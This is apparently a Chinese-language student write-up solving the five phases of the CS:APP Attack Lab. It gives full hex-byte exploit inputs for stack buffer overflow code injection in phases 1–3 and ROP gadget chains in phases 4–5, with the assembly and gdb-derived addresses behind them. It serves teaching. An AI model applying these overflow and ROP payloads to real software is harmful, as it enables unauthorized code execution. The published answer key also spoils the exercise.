## Phase1
phase1很简单，关键就是**用touch1的地址覆盖掉原来的返回地址**
直接用objdump反汇编一下

![attacklab](/assets/imgs/attacklab/attacklab-1.png)

不难注意到在getbuf中的第一行就在栈帧上分配了18个bytes的空间，那么我们只需要首先给出18个bytes的垃圾值，再在后面跟上touch1的地址覆盖掉原来的返回地址，程序就会在ret时跳转到touch1
于是，我们就得到了Phase1的解

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
10 17 40 00 00 00 00 00 //touch1
```

运行结果如下

![attacklab](/assets/imgs/attacklab/attacklab-2.png)

## Phase2
和Phase1的不同在于Phase2需要传递参数，即**把我的cookie传递到rdi寄存器中**
所以需要想办法让程序执行下面的汇编代码

```nasm
movq $0x45730404,%rdi
pushq $0x40173c
ret
```

其中0x40173c是touch2的地址

使用gcc编译再用objdump反汇编，会得到

```nasm
0000000000000000 <.text>:
   0:	48 c7 c7 04 04 73 45 	mov    $0x45730404,%rdi
   7:	68 3c 17 40 00       	push   $0x40173c
   c:	c3                   	ret
```

这样就得到了想要执行的代码，只需要想办法让程序能够执行这些代码就可以了
尝试把这段代码当做输入，那么只需要获取这段代码的地址即可
于是，我们使用gdb，在getbuf上打上断点，即可得到此时的栈顶地址，也就是这段代码的地址：0x55657f98

![attacklab](/assets/imgs/attacklab/attacklab-3.png)

于是尝试以下的输入：

```
48 c7 c7 04 04 73 45 68
3c 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
98 7f 65 55 00 00 00 00
```

会发现非常顺利

![attacklab](/assets/imgs/attacklab/attacklab-4.png)

## Phase3
不难发现Phase3和Phase2的差别并不是很大， 只不过想要传递的值变为了字符串(我的cookie)的地址而已，但我的cookie在原程序中并不存在，所以只能通过我的输入存储在栈上。

我的cookie是0x45730404，转换为ascii码是34 35 37 33 30 34 30 34，文档中说

> The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.”

于是我的第一个解答诞生了

```
34 35 37 33 30 34 30 34
48 c7 c7 98 7f 65 55 68
4d 18 40 00 c3 00 00 00
a0 7f 65 55 00 00 00 00
```

我的想法就是把需要的字符串首先输入，存储在getbuf的栈帧上，然后就可执行如下指令

```nasm
movq $0x55657f98,%rdi 
pushq $0x40184d
ret
```

这其中，0x55657f98是getbuf的栈顶的位置，此时这里存储着需要的字符串，0x40184d是touch3的地址。由于0x55657f98上并不是想要执行的代码，所以在输入中，把返回地址覆盖为0x55657fa0。
出乎我的意料的是竟然没有成功，仔细看文档，发现在Advice中还有这种东西：

>When functions hexmatch and strncmp are called, they push data onto the stack, overwriting portions of memory that held the buffer used by getbuf. As a result, you will need to be careful where you place the string representation of your cookie.

所以我的字符串并不能放在getbuf的栈帧中....
注意到getbuf是由test调用，二者的关系如下：

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}

void test()
{
	int val;
	val = getbuf();
	printf("...");
}
```

所以接下来尝试把字符串放在test的栈帧中
于是有了第二个答案：

```
48 c7 c7 b8 7f 65 55 68
4d 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
98 7f 65 55 00 00 00 00
34 35 37 33 30 34 30 34
```

与第一个答案不同的是，在我想要执行的指令中，字符串的地址变为了0x55657fb8。这是因为此时字符串在test的栈帧中，我们获取test的栈顶地址

![attacklab](/assets/imgs/attacklab/attacklab-5.png)

就是字符串的地址
于是Phase3就被我们解决了

![attacklab](/assets/imgs/attacklab/attacklab-6.png)

## Phase4
从Phase4开始就进入了ROP阶段，由于栈的随机化等等保护措施，我们并不能像前三个Phase那样
直接注入代码，而是调用程序中本就存在的代码，也就是gadget
Phase4仍然是解决touch2，需要输入我们的cookie
首先我们需要想办法把我们的cookie传递到程序中，由于栈的位置不确定，不能直接使用立即数了，只能想办法把cookie传递给rdi寄存器
我们只需要把我的cookie放到栈顶，然后执行如下指令

```nasm
popq %rdi
ret
```

然而我们翻遍`farm`也只能找到`popq %rax`对应的字节码，于是只能这样

```nasm
popq %rax  //58
movq %rax,%rdi //48 89 c7
```

![attacklab](/assets/imgs/attacklab/attacklab-7.png)
![attacklab](/assets/imgs/attacklab/attacklab-8.png)

二者可以在如上的位置找到，于是我们就得到了解

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ec 18 40 00 00 00 00 00
04 04 73 45 00 00 00 00
12 19 40 00 00 00 00 00
3c 17 40 00 00 00 00 00 //touch2
```

![attacklab](/assets/imgs/attacklab/attacklab-9.png)

尝试运行，发现成功解决

## Phase5
这最后一个Phase同样是通过ROP的方式让程序执行touch3，同样的，需要想办法把我的cookie字符串放在栈上，并想办法把它的地址传递给rdi寄存器
同样由于栈的地址不确定，不能直接解决
注意到`farm.c`中有这样一个函数

```c
/* Add two arguments */
long add_xy(long x, long y)
{
	return x+y;
}
```

其对应的汇编是这样

```nasm
0000000000401923 <add_xy>:
  401923: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
  401927: c3                    ret
```

或许我们可以想办法获取rsp的值和cookie字符串在栈上的偏移量，然后利用这个函数来得到字符串的绝对地址
首先想办法获取rsp的值，在`farm.c`的汇编文件中搜索一下，发现只能执行`movq %rsp,%rax`

![attacklab](/assets/imgs/attacklab/attacklab-10.png)

这里的`48 89 e0`即是`movq %rsp,%rax`
接下来我们想执行`movq %rax,%rdi`或者`movq %rax,%rsi`，一搜索，还真有！

![attacklab](/assets/imgs/attacklab/attacklab-11.png)

然而只有`48 89 c7`，也就是`movq %rax,%rdi`
那么我们只能想办法把偏移量传给rsi了，我们这时候显然并不知道偏移量，但我们知道如何把偏移量传递给寄存器，也就是使用popq指令，然而同样的，我们只能找到`popq %rax`对应的字节码，接下来的任务就是想办法把rax的值传给rsi了
经过一系列的尝试(这里就不写了)，我们最后发现只有这么一套操作是可行的：

```nasm
movl %eax,%ecx
movl %ecx,%edx
movl %edx,%esi
```

于是我们可以暂时的得到我们的答案了

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
3f 19 40 00 00 00 00 00 //movq %rsp,%rax
12 19 40 00 00 00 00 00 //movq %rax,%rdi
ec 18 40 00 00 00 00 00 //popq %rax
XX 00 00 00 00 00 00 00 //偏移量
af 19 40 00 00 00 00 00 //movl %eax,%ecx
73 19 40 00 00 00 00 00 //movl %ecx,%edx
8e 19 40 00 00 00 00 00 //movl %edx,%esi
23 19 40 00 00 00 00 00 //lea (%rdi,%rsi,1),%rax
12 19 40 00 00 00 00 00 //movq %rax,%rdi 再把字符串的地址传递给rdi
4d 18 40 00 00 00 00 00 //touch3
34 35 37 33 30 34 30 34 //Cookie字符串
```

有了这些，也不难确定偏移量XX为0x48了，尝试运行

![attacklab](/assets/imgs/attacklab/attacklab-12.png)

到此，全部解决！

